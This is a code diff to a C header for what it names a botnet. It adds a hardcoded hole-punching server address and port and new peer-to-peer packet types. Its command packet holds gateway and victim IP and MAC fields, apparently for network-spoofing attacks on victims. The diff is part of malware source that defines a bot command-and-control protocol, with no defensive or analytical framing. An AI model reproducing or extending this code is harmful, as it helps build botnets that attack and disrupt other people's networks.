@@ -3,16 +3,22 @@
 #include <WS2tcpip.h>
 #pragma comment(lib, "Ws2_32.lib")
 
+#define HOLE_PUNCHING_SERVER_PORT 33866
+#define HOLE_PUNCHING_SERVER_IP "15.237.26.178"
 
 enum PACK_TYPE
 {
 	//UDP
 	SYNC_REQUEST, // Used when a bot wants to tell it exists
 	SYNC_REPLY, // Used to send network structure syncs
-	VERSION_SYNC_REQUEST, //Ask for database info 
+
+	PEER_REQUEST,
+	PEER_REPLY,
+
 	COMMAND,
 	COMMAND_RESULT,
 	//TCP
+	VERSION_SYNC_REQUEST, //Ask for database info 
 	VERSION_SYNC //Sync database info
 	,
 };
@@ -27,14 +33,22 @@ struct network_adapter
 struct botnet_pack
 {
 	enum PACK_TYPE type;
-	
-	/*-----commnad-----*/
+	/*-------commnad-------*/
 	BYTE act;
 	ULONG32 gateway_ip;
 	ULONG32 victim_ip;
 	BYTE gateway_mac[6];
 	BYTE victim_mac[6];
-	/*-----------------*/
+	/*---------------------*/
+	
+	/*--p2p-communication--*/
+	union
+	{
+		uint16_t id; // commands 
+		uint16_t num_of_hosts; // p2p establishing
+	} numerics ;
+	struct { uint32_t ip; uint16_t port;} peer;
+	/*---------------------*/
 };
 
 #ifdef __cplusplus
